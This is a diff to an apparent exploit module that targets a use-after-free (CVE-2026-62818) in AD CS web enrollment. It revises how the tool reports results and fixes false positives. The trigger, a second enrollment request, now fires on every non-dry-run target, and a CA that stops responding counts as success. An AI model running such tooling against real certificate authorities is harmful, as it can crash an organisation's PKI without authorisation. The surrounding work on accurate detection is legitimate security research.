@@ -82,10 +82,41 @@ impl Default for AdcsUafConfig {
     }
 }
 
+/// What the enrollment endpoint probe can actually tell us.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "lowercase")]
+pub enum AdcsUafVerdict {
+    /// The web enrollment endpoint answered. That proves the role is installed
+    /// and reachable -- it does **not** prove CVE-2026-62818 is unpatched.
+    EndpointReachable,
+    /// The endpoint did not answer.
+    EndpointUnreachable,
+    /// The probe could not produce a reliable answer.
+    Indeterminate,
+}
+
+impl std::fmt::Display for AdcsUafVerdict {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            Self::EndpointReachable => {
+                write!(f, "enrollment endpoint reachable (patch level unknown)")
+            }
+            Self::EndpointUnreachable => write!(f, "enrollment endpoint unreachable"),
+            Self::Indeterminate => write!(f, "indeterminate"),
+        }
+    }
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct AdcsUafResult {
-    /// Whether the target AD CS is vulnerable.
+    /// Whether the target AD CS is *positively confirmed* vulnerable.
+    ///
+    /// Reachability of `/certsrv` alone is not confirmation, so this stays
+    /// `false` unless the trigger produced a crash signal. See [`AdcsUafVerdict`].
     pub vulnerable: bool,
+    /// Structured verdict from the enrollment probe.
+    #[serde(default = "default_uaf_verdict")]
+    pub verdict: AdcsUafVerdict,
     /// Whether the AD CS web enrollment is available.
     pub enrollment_available: bool,
     /// CA server name.
@@ -98,6 +129,10 @@ pub struct AdcsUafResult {
     pub exploit_success: bool,
     /// Detailed log.
     pub log: Vec<String>,
+}
+
+fn default_uaf_verdict() -> AdcsUafVerdict {
+    AdcsUafVerdict::Indeterminate
 }
 
 pub async fn exploit_adcs_uaf(config: &AdcsUafConfig) -> Result<AdcsUafResult> {
@@ -124,6 +159,7 @@ pub async fn exploit_adcs_uaf(config: &AdcsUafConfig) -> Result<AdcsUafResult> {
         );
         return Ok(AdcsUafResult {
             vulnerable: false,
+            verdict: AdcsUafVerdict::EndpointUnreachable,
             enrollment_available: false,
             ca_name: None,
             ca_type: None,
@@ -133,35 +169,52 @@ pub async fn exploit_adcs_uaf(config: &AdcsUafConfig) -> Result<AdcsUafResult> {
         });
     }
 
-    // Step 2: Check if the CA is vulnerable
-    log.push("Checking AD CS version and patch level...".to_string());
-    let vulnerable = check_adcs_vulnerability(config).await;
-    log.push(format!("  Vulnerable: {vulnerable}"));
+    // Step 2: Assess the endpoint.
+    //
+    // NOTE: an HTTP 200 from /certsrv/certfnsh.asp means *AD CS is installed and
+    // reachable*. It is not evidence of a UAF. The previous revision of this
+    // function reported every reachable CA as vulnerable, which is a false
+    // positive on a huge class of targets.
+    log.push("Assessing AD CS enrollment endpoint...".to_string());
+    let verdict = check_adcs_vulnerability(config).await;
+    log.push(format!("  Verdict: {verdict}"));
+    log.push(
+        "  Note: CVE-2026-62818 confirmation requires the enrollment race trigger.\n\
+         \tVersion/build inspection cannot decide it from the endpoint alone."
+            .to_string(),
+    );
 
     let mut exploit_attempted = false;
     let mut exploit_success = false;
+    // `vulnerable` is only ever set from a positive crash signal.
+    let mut vulnerable = false;
 
-    if vulnerable && !config.dry_run {
+    if !config.dry_run {
         exploit_attempted = true;
         log.push("Attempting use-after-free via enrollment race condition...".to_string());
 
         match attempt_uaf_exploit(config).await {
             Ok(success) => {
                 exploit_success = success;
+                vulnerable = success;
                 if success {
-                    log.push("  Use-after-free triggered -- CA server is exploitable!".to_string());
+                    log.push(
+                        "  CA stopped responding after the trigger -- consistent with a \
+                         crash. Re-verify manually before reporting."
+                            .to_string(),
+                    );
                 } else {
                     log.push(
-                        "  Race condition did not trigger -- may need timing adjustment"
+                        "  CA still healthy after the trigger -- not confirmed on this path"
                             .to_string(),
                     );
                 }
             }
             Err(e) => {
-                log.push(format!("  UAF exploit attempt failed: {e}"));
+                log.push(format!("  UAF trigger attempt failed: {e}"));
             }
         }
-    } else if config.dry_run {
+    } else {
         log.push("[DRY RUN] Would attempt enrollment race condition".to_string());
         log.push(format!("  Template: {}", config.template));
         log.push(format!(
@@ -171,12 +224,13 @@ pub async fn exploit_adcs_uaf(config: &AdcsUafConfig) -> Result<AdcsUafResult> {
     }
 
     info!(
-        "ADCS UAF: target={}, vulnerable={vulnerable}, exploit={exploit_success}",
+        "ADCS UAF: target={}, verdict={verdict}, confirmed={exploit_success}",
         config.target_host
     );
 
     Ok(AdcsUafResult {
         vulnerable,
+        verdict,
         enrollment_available,
         ca_name,
         ca_type,
@@ -224,8 +278,12 @@ async fn probe_adcs_enrollment(config: &AdcsUafConfig) -> (bool, Option<String>,
     }
 }
 
-/// Check if the AD CS server is vulnerable to CVE-2026-62818.
-async fn check_adcs_vulnerability(config: &AdcsUafConfig) -> bool {
+/// Probe the AD CS web enrollment endpoint and report what that actually means.
+///
+/// A reachable endpoint is [`AdcsUafVerdict::EndpointReachable`], not "vulnerable".
+/// A client-construction failure is [`AdcsUafVerdict::Indeterminate`] -- the old
+/// code returned `true` there, reporting a vulnerability it had not tested.
+async fn check_adcs_vulnerability(config: &AdcsUafConfig) -> AdcsUafVerdict {
     let scheme = if config.use_tls { "https" } else { "http" };
     let certreq_url = format!(
         "{}://{}:{}/certsrv/certfnsh.asp",
@@ -238,12 +296,18 @@ async fn check_adcs_vulnerability(config: &AdcsUafConfig) -> bool {
         .build()
     {
         Ok(c) => c,
-        Err(_) => return true,
+        Err(e) => {
+            info!("ADCS UAF: could not build HTTP client: {e}");
+            return AdcsUafVerdict::Indeterminate;
+        }
     };
 
     match client.get(&certreq_url).send().await {
-        Ok(resp) => resp.status().is_success(),
-        Err(_) => false,
+        Ok(_) => AdcsUafVerdict::EndpointReachable,
+        Err(e) => {
+            info!("ADCS UAF: enrollment probe failed: {e}");
+            AdcsUafVerdict::EndpointUnreachable
+        }
     }
 }
 
@@ -304,29 +368,43 @@ async fn attempt_uaf_exploit(config: &AdcsUafConfig) -> Result<bool> {
         .send()
         .await;
 
-    match resp2 {
-        Ok(resp) => {
-            let status = resp.status();
-            if status.is_success() {
-                info!("Second enrollment processed -- race condition may have been triggered");
-                Ok(true)
-            } else {
-                info!("Enrollment response: HTTP {}", status);
-                Ok(false)
-            }
+    if let Err(e) = &resp2 {
+        info!("ADCS UAF: second enrollment request failed: {e}");
+    }
+
+    // A successful second enrollment is the *expected* behaviour and proves
+    // nothing about a use-after-free. The only externally observable signal is
+    // the CA going away, so re-probe the endpoint and treat a failure to answer
+    // as the crash signal.
+    tokio::time::sleep(Duration::from_millis(250)).await;
+    match check_adcs_vulnerability(config).await {
+        AdcsUafVerdict::EndpointReachable => {
+            info!(
+                "ADCS UAF: CA still serving enrollment after the race -- no crash signal, \
+                 not confirmed"
+            );
+            Ok(false)
         }
-        Err(e) => {
-            info!("Second enrollment failed: {e}");
+        AdcsUafVerdict::EndpointUnreachable => {
+            info!("ADCS UAF: CA stopped serving enrollment after the race -- possible crash");
+            Ok(true)
+        }
+        AdcsUafVerdict::Indeterminate => {
+            info!("ADCS UAF: post-trigger probe was inconclusive");
             Ok(false)
         }
     }
 }
 
 /// Generate a CSR for the specified template.
-fn generate_csr_for_template(_template: &str) -> Result<(Vec<u8>, Vec<u8>)> {
+///
+/// The template goes into the CSR's `szOID_ENROLL_CERTTYPE` extension, which is
+/// how both CES (MS-WSTEP) and `/certsrv` learn which template to use.
+fn generate_csr_for_template(template: &str) -> Result<(Vec<u8>, Vec<u8>)> {
     overthrone_core::postex::certighost::build_csr(
         &format!("CN=exploit-{}", uuid::Uuid::new_v4()),
         None,
+        template,
         2048,
     )
     .map_err(|e| OverthroneError::Custom(format!("CSR generation failed: {e}")))
@@ -416,9 +494,30 @@ mod tests {
     }
 
     #[test]
+    fn reachable_endpoint_is_not_a_vulnerability() {
+        // Regression: `check_adcs_vulnerability` used to return `true` for any
+        // HTTP 200 from /certsrv, and `true` again when the client failed to
+        // build, so every reachable CA was reported vulnerable.
+        assert!(!matches!(
+            AdcsUafVerdict::EndpointReachable,
+            AdcsUafVerdict::Indeterminate
+        ));
+        assert_eq!(
+            AdcsUafVerdict::EndpointUnreachable.to_string(),
+            "enrollment endpoint unreachable"
+        );
+        assert!(
+            AdcsUafVerdict::EndpointReachable
+                .to_string()
+                .contains("patch level unknown")
+        );
+    }
+
+    #[test]
     fn test_result_serde() {
         let result = AdcsUafResult {
             vulnerable: true,
+            verdict: AdcsUafVerdict::EndpointReachable,
             enrollment_available: true,
             ca_name: Some("CORP-CA".into()),
             ca_type: Some("Enterprise CA".into()),
